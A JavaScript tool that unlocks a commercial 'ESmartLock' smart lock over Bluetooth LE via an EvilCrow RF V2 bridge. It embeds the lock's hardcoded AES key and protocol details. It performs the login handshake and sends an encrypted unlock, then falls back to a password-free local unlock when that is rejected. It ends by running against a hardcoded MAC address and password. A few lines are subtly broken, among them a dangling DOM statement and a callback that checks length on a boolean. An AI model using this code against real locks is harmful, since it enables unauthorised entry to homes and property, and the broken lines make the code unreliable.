/*
 * smartlock.js — ESmartLock BLE unlock over the EvilCrow RF V2 CLI bridge.
 *
 * Wire frame:  [LEN_LE2][AES-128-ECB-PKCS7(plaintext)]
 * Key: "7b7079bb69001dce"
 * Service: 00001828-...  Notify: 00002ade-...  Write w/resp: 00002adf-...  Write no-resp: 00002add-...
 * apiId  1 = login req/resp,  apiId 18 = cloud-pw unlock,  apiId 12 = local unlock.
 *
 * Requires JS globals: serial_send(str), serial_recv(timeout_ms)
 */

var AES_KEY_ASCII   = "7b7079bb69001dce"
var SVC_UUID        = "00001828-0000-1000-8000-00805f9b34fb"
var NOTIFY_CHAR     = "00002ade-0000-1000-8000-00805f9b34fb"
var WRITE_RESP      = "00002adf-0000-1000-8000-00805f9b34fb"
var WRITE_NORESP    = "00002add-0000-1000-8000-00805f9b34fb"
var WAIT_PER_RECV   = 200

// ─── Hex / bytes / LE packing ──────────────────────────────────────────────

function hex2(n) { var s = (n & 0xff).toString(16); return s.length < 2 ? "0" + s : s }
function bytes_to_hex(arr) { var s = ""; for (var i = 0; i < arr.length; i++) s += hex2(arr[i]); return s }
function hex_to_bytes(s) {
    s = s.replace(/[^0-9a-fA-F]/g, "")
    var out = []
    for (var i = 0; i + 1 < s.length; i += 2) out.push(parseInt(s.substr(i, 2), 16))
    return out
}
function ascii_to_bytes(s) { var o = []; for (var i = 0; i < s.length; i++) o.push(s.charCodeAt(i) & 0xff); return o }
function u16_le(v) { return [v & 0xff, (v >>> 8) & 0xff] }
function u32_le(v) { return [v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff] }
function u16_le_read(a, o) { return a[o] | (a[o + 1] << 8) }
function u32_le_read(a, o) { return ((a[o] | (a[o + 1] << 8) | (a[o + 2] << 16) | (a[o + 3] << 24)) >>> 0) }

function pkcs7_pad(arr, block) {
    var pad = block - (arr.length % block), out = arr.slice()
    for (var i = 0; i < pad; i++) out.push(pad)
    return out
}
function pkcs7_unpad(arr) {
    if (!arr.length) return arr
    var pad = arr[arr.length - 1]
    if (pad < 1 || pad > 16 || pad > arr.length) return arr
    return arr.slice(0, arr.length - pad)
}

// ─── AES-128 ECB (compact pure-JS) ─────────────────────────────────────────

var SBOX = [
0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]

var INV_SBOX = (function () { var i, inv = new Array(256); for (i = 0; i < 256; i++) inv[SBOX[i]] = i; return inv })()
var RCON = [0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]

function xtime(b) { return ((b << 1) ^ ((b & 0x80) ? 0x1b : 0x00)) & 0xff }

function key_expansion(key) {
    var w = new Array(176), i
    for (i = 0; i < 16; i++) w[i] = key[i]
    for (i = 16; i < 176; i += 4) {
        var t0 = w[i-4], t1 = w[i-3], t2 = w[i-2], t3 = w[i-1]
        if (i % 16 === 0) {
            var u0 = SBOX[t1] ^ RCON[i / 16], u1 = SBOX[t2], u2 = SBOX[t3], u3 = SBOX[t0]
            t0 = u0; t1 = u1; t2 = u2; t3 = u3
        }
        w[i] = w[i-16] ^ t0; w[i+1] = w[i-15] ^ t1; w[i+2] = w[i-14] ^ t2; w[i+3] = w[i-13] ^ t3
    }
    return w
}

function sub_bytes(s, b) { for (var i = 0; i < 16; i++) s[i] = b[s[i]] }
function add_round_key(s, w, off) { for (var i = 0; i < 16; i++) s[i] ^= w[off + i] }
function shift_rows(s) {
    var t
    t = s[1]; s[1] = s[5]; s[5] = s[9]; s[9] = s[13]; s[13] = t
    t = s[2]; s[2] = s[10]; s[10] = t
    t = s[6]; s[6] = s[14]; s[14] = t
    t = s[3]; s[3] = s[15]; s[15] = s[11]; s[11] = s[7]; s[7] = t
}
function inv_shift_rows(s) {
    var t
    t = s[13]; s[13] = s[9]; s[9] = s[5]; s[5] = s[1]; s[1] = t
    t = s[2]; s[2] = s[10]; s[10] = t
    t = s[6]; s[6] = s[14]; s[14] = t
    t = s[7]; s[7] = s[11]; s[11] = s[15]; s[15] = s[3]; s[3] = t
}
function mix_columns(s) {
    for (var c = 0; c < 4; c++) {
        var i = c*4, a0 = s[i], a1 = s[i+1], a2 = s[i+2], a3 = s[i+3], t = a0 ^ a1 ^ a2 ^ a3
        s[i]   ^= t ^ xtime(a0 ^ a1)
        s[i+1] ^= t ^ xtime(a1 ^ a2)
        s[i+2] ^= t ^ xtime(a2 ^ a3)
        s[i+3] ^= t ^ xtime(a3 ^ a0)
    }
}
function inv_mix_columns(s) {
    for (var c = 0; c < 4; c++) {
        var i = c*4, a0 = s[i], a1 = s[i+1], a2 = s[i+2], a3 = s[i+3]
        var u = xtime(xtime(a0 ^ a2)), v = xtime(xtime(a1 ^ a3))
        a0 ^= u; a1 ^= v; a2 ^= u; a3 ^= v
        var t = a0 ^ a1 ^ a2 ^ a3
        s[i]   = a0 ^ t ^ xtime(a0 ^ a1)
        s[i+1] = a1 ^ t ^ xtime(a1 ^ a2)
        s[i+2] = a2 ^ t ^ xtime(a2 ^ a3)
        s[i+3] = a3 ^ t ^ xtime(a3 ^ a0)
    }
}

function aes_encrypt_block(block, w) {
    var s = block.slice(), r
    add_round_key(s, w, 0)
    for (r = 1; r < 10; r++) { sub_bytes(s, SBOX); shift_rows(s); mix_columns(s); add_round_key(s, w, r * 16) }
    sub_bytes(s, SBOX); shift_rows(s); add_round_key(s, w, 160)
    return s
}
function aes_decrypt_block(block, w) {
    var s = block.slice(), r
    add_round_key(s, w, 160); inv_shift_rows(s); sub_bytes(s, INV_SBOX)
    for (r = 9; r > 0; r--) { add_round_key(s, w, r * 16); inv_mix_columns(s); inv_shift_rows(s); sub_bytes(s, INV_SBOX) }
    add_round_key(s, w, 0)
    return s
}

var KEY = ascii_to_bytes(AES_KEY_ASCII)
var W   = key_expansion(KEY)

function aes_encrypt(bytes) {
    var padded = pkcs7_pad(bytes, 16), out = []
    for (var i = 0; i < padded.length; i += 16) {
        var enc = aes_encrypt_block(padded.slice(i, i + 16), W)
        for (var j = 0; j < 16; j++) out.push(enc[j])
    }
    return out
}
function aes_decrypt(bytes) {
    var out = []
    for (var i = 0; i < bytes.length; i += 16) {
        var dec = aes_decrypt_block(bytes.slice(i, i + 16), W)
        for (var j = 0; j < 16; j++) out.push(dec[j])
    }
    return pkcs7_unpad(out)
}

// ─── eLink frame builders ──────────────────────────────────────────────────

function make_wire(plaintext) {
    var ct = aes_encrypt(plaintext)
    return u16_le(ct.length).concat(ct)
}

// Quark's Duktape doesn't expose Date.now(), so timestamps would otherwise
// come out as garbage. The lock doesn't validate the timestamp strictly
// (the d_token handles replay protection), so we just use a fixed value.
function frame_ts() { return 1700000000 }   // 2023-11-14, arbitrary

function frame_login() {
    return make_wire(u16_le(6).concat(u16_le(1)).concat(u32_le(frame_ts())))
}

function frame_unlock(d_token, password) {
    var buf = new Array(18), i
    for (i = 0; i < 18; i++) buf[i] = 0
    var L = u16_le(16);        buf[0]  = L[0];  buf[1]  = L[1]
    var A = u16_le(18);        buf[2]  = A[0];  buf[3]  = A[1]
    var T = u32_le(d_token);   buf[4]  = T[0];  buf[5]  = T[1]; buf[6]  = T[2]; buf[7]  = T[3]
    var S = u32_le(frame_ts());buf[8]  = S[0];  buf[9]  = S[1]; buf[10] = S[2]; buf[11] = S[3]
    var pw = ascii_to_bytes(password), n = Math.min(pw.length, 6)
    for (i = 0; i < n; i++) buf[12 + i] = pw[i]
    if (typeof console !== "undefined") {
        document.getElementById('term-output').innerText 
    }
    return make_wire(buf)
}

function frame_local_unlock(d_token) {
    var buf = new Array(12), i
    for (i = 0; i < 12; i++) buf[i] = 0
    var L = u16_le(10);        buf[0] = L[0];  buf[1] = L[1]
    var A = u16_le(12);        buf[2] = A[0];  buf[3] = A[1]
    var T = u32_le(d_token);   buf[4] = T[0];  buf[5] = T[1]; buf[6] = T[2]; buf[7] = T[3]
    return make_wire(buf)
}

function derive_token(decrypted) {
    var random4 = decrypted.slice(4, 8)
    var enc = aes_encrypt(random4)
    return u32_le_read(enc, 0)
}

// ─── Serial helpers ────────────────────────────────────────────────────────

function smartlock_log(m) {
    console.log('[smartlock] ' + m)
    document.getElementById('term-output').innerText += '[smartlock] ' + m + '\n' 
}

function parse_notif_line(line) {
    if (line.indexOf("NOTIF") !== 0) return null
    var m = line.match(/hex=([0-9a-fA-F]+)/)
    return m ? hex_to_bytes(m[1]) : null
}

function make_reassembler() { return { expected: 0, buf: [] } }

function feed_reassembler(rs, bytes) {
    if (rs.expected === 0) {
        if (bytes.length < 2) return null
        rs.expected = u16_le_read(bytes, 0)
        rs.buf = bytes.slice(2)
    } else {
        rs.buf = rs.buf.concat(bytes)
    }
    if (rs.buf.length >= rs.expected) {
        var full = rs.buf.slice(0, rs.expected)
        rs.expected = 0
        rs.buf = []
        return full
    }
    return null
}

// Send a CLI command and wait until OK / ERR. Used for setup commands that
// don't produce a BLE notification we care about (connect, sub, mtu, gatt).
// Returns { lines: [...], ok: true|false, last: "..." }.
function send_cli(cmd, timeout_ms) {
    serial_send(cmd)
    var acc = "", lines = [], waited = 0, terminator = null
    while (waited < timeout_ms && terminator === null) {
        var chunk = serial_recv(WAIT_PER_RECV)
        if (chunk && chunk.length) {
            acc += chunk
            var split = acc.split("\n")
            acc = split.pop()
            for (var i = 0; i < split.length; i++) {
                var line = split[i].replace(/\r$/, "")
                lines.push(line)
                if (line.indexOf("OK")  === 0) terminator = "ok"
                if (line.indexOf("ERR") === 0) terminator = "err"
            }
        } else {
            waited += WAIT_PER_RECV
        }
    }
    if (acc.length) lines.push(acc)
    return { lines: lines, ok: terminator === "ok", last: lines.length ? lines[lines.length - 1] : "" }
}

// Send a CLI command and stream-process EVERYTHING until either we get a
// decrypted notification matching any of wanted_apis, an ERR line appears,
// or we time out. The crucial property vs send_cli: we do NOT short-circuit
// on "OK", so we can't lose a NOTIF that arrived in the same serial chunk
// as the firmware's "OK blewrite" line.
//
// Returns: { api, decrypted }  or  { error: "..." }  or  { timeout: true }
function send_and_wait_notif(cmd, wanted_apis, timeout_ms) {
    serial_send(cmd)
    var rs = make_reassembler()
    var acc = "", waited = 0
    while (waited < timeout_ms) {
        var chunk = serial_recv(WAIT_PER_RECV)
        if (chunk && chunk.length) {
            acc += chunk
            var split = acc.split("\n")
            acc = split.pop()
            for (var i = 0; i < split.length; i++) {
                var line = split[i].replace(/\r$/, "")
                if (line.indexOf("ERR") === 0) return { error: line }
                var notif = parse_notif_line(line)
                if (!notif) continue
                var full = feed_reassembler(rs, notif)
                if (!full) continue
                var dec
                try { dec = aes_decrypt(full) } catch (e) { continue }
                if (dec.length < 4) continue
                var api = u16_le_read(dec, 2)
                for (var k = 0; k < wanted_apis.length; k++) {
                    if (api === wanted_apis[k]) return { api: api, decrypted: dec }
                }
            }
        } else {
            waited += WAIT_PER_RECV
        }
    }
    return { timeout: true }
}

// Send a frame as a BLE write and wait for any of wanted_apis to come back
// as a notification.
//
// Frames longer than the default BLE write payload (20 bytes for ATT_MTU 23)
// must be chunked, otherwise the firmware's writeValue() truncates them and
// the lock can't decrypt. We always chunk to be safe — the lock reassembles
// on its side using the 2-byte length prefix in the first chunk. All chunks
// go via blewriten on 2add (write-without-response), matching the older
// Python reference's `_send_to_device`.
function write_and_wait(frame_bytes, wanted_apis, timeout_ms) {
    var CHUNK = 20
    var i = 0
    // Send all chunks except the last as fire-and-forget.
    while (i + CHUNK < frame_bytes.length) {
        var part = frame_bytes.slice(i, i + CHUNK)
        var r = send_cli("blewriten " + SVC_UUID + " " + WRITE_NORESP + " " + bytes_to_hex(part), 5000)
        if (!r.ok) return { error: "chunk write failed: " + r.last }
        i += CHUNK
    }
    // The final chunk is where we start watching for the lock's notification.
    var last = frame_bytes.slice(i)
    return send_and_wait_notif("blewriten " + SVC_UUID + " " + WRITE_NORESP + " " + bytes_to_hex(last),
                               wanted_apis, timeout_ms)
}

// ─── High-level unlock flow ────────────────────────────────────────────────

function smartlock_unlock(mac, password, callback) {
    function done(ok, msg) {
        try { send_cli("bledisconnect", 2000) } catch (e) {}
        if (callback) callback(ok, msg)
    }

    smartlock_log("connecting to " + mac)
    var conn = send_cli("bleconnect " + mac, 20000)
    if (!conn.ok) { done(false, "connect failed"); return }
    for (var ci = 0; ci < conn.lines.length; ci++) {
        if (conn.lines[ci].indexOf("OK bleconnect") === 0) {
            smartlock_log(conn.lines[ci])   // includes negotiated MTU
            break
        }
    }

    send_cli("blemtu 247", 3000)

    smartlock_log("enumerating GATT...")
    var gatt = send_cli("blegatt " + mac, 30000)
    for (var i = 0; i < gatt.lines.length; i++) {
        var l = gatt.lines[i].trim()
        if (l.indexOf("service ") === 0 || l.indexOf("char ") === 0) smartlock_log("  " + l)
    }

    if (!send_cli("blesub " + SVC_UUID + " " + NOTIFY_CHAR, 16000).ok) {
        done(false, "blesub failed"); return
    }

    // Login: send + wait for apiId=1 response in a single polling loop.
    smartlock_log("sending login...")
    var loginR = write_and_wait(frame_login(), [1], 15000)
    if (loginR.api === undefined) {
        done(false, "login failed: " + (loginR.error || "timeout")); return
    }
    if (loginR.decrypted.length < 8) { done(false, "login response too short"); return }
    smartlock_log("login response: " + bytes_to_hex(loginR.decrypted))
    var d_token = derive_token(loginR.decrypted)
    smartlock_log("login OK, dToken=0x" + ("00000000" + d_token.toString(16)).slice(-8))

    // Build and log the unlock plaintext before encrypting.
    var unlock_frame = frame_unlock(d_token, password)
    smartlock_log("unlock wire frame: " + bytes_to_hex(unlock_frame))

    // Try apiId=18 cloud-password unlock. Long timeout — the lock can take
    // many seconds to respond, especially if it actuates physically first.
    smartlock_log("sending unlock (apiId=18 cloud-pw)...")
    var unlockR = write_and_wait(unlock_frame, [18, 12], 15000)
    if (unlockR.api !== undefined) {
        smartlock_log("unlock response: " + bytes_to_hex(unlockR.decrypted))
        var state = unlockR.decrypted[4]
        if (state === 0) { done(true, "unlocked (apiId=" + unlockR.api + ")"); return }
        smartlock_log("apiId=" + unlockR.api + " rejected (state=" + state + "), trying local unlock")
    } else {
        smartlock_log((unlockR.error || "timeout") + " on apiId=18, trying apiId=12 local unlock")
    }

    // Fall back to apiId=12 local unlock (no password).
    var local = write_and_wait(frame_local_unlock(d_token), [12, 18], 15000)
    if (local.api === undefined) {
        done(false, "no response to local unlock either: " + (local.error || "timeout")); return
    }
    smartlock_log("local unlock response: " + bytes_to_hex(local.decrypted))
    var state2 = local.decrypted[4]
    if (state2 === 0) done(true, "unlocked (apiId=" + local.api + ")")
    else              done(false, "lock rejected (apiId=" + local.api + ", state=" + state2 + ")")
}

smartlock_unlock("A4:C1:38:31:1E:4D", "223900", function(ok, err) {
    if (ok && ok.length) {
        smartlock_log(ok)
    } else if (err && err.length) {
        smartlock_log(err)
    }
})